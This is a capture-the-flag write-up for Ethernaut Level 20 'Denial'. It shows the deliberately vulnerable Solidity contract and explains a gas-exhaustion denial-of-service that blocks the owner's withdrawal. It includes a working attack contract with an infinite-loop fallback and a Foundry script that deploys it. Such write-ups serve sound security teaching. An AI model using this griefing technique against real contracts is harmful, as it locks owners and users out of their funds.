# Ethernaut Level 20 Denial

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

We have to find out a way to block the owner from withdrawing money. It's natural to think that when someone calls `withdraw()` function, we want the logic to be stuck at `partner.call{value: amountToSend}("");` so that the owner would never withdraw any money. Maybe you have thought of *Reentrancy*. However, we cannot drain the balance of the contract, so calling back `withdraw()` in an attack contract's `receive()` function is not a good idea. 

We can exhaust the gas limit by implementing an infinite loop inside the attack contract's `fallback` function, so that before entering next code line, we have used up all the available gas, so the `transfer()` will not successfully happen.

In a transaction, gas is usually paid by the `tx.origin`, i.e. the initiator of a transaction.

`DeniaAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttack {
    IDenial denial;

    constructor(address _denialAddress) {
        denial = IDenial(_denialAddress);
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while(true) {}
    }
}   
```

`Denial.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";
import {DenialAttack} from "../src/DenialAttack.sol";

contract DenialScript is Script {
    Denial denial = Denial(payable(0xXXXXXXXX));
    DenialAttack denialAttack;

    function run() external {
        vm.startBroadcast();
        console.log("deployer:", msg.sender);
        denialAttack = new DenialAttack(address(denial));
        denialAttack.attack();
        vm.stopBroadcast();
    }
}
```

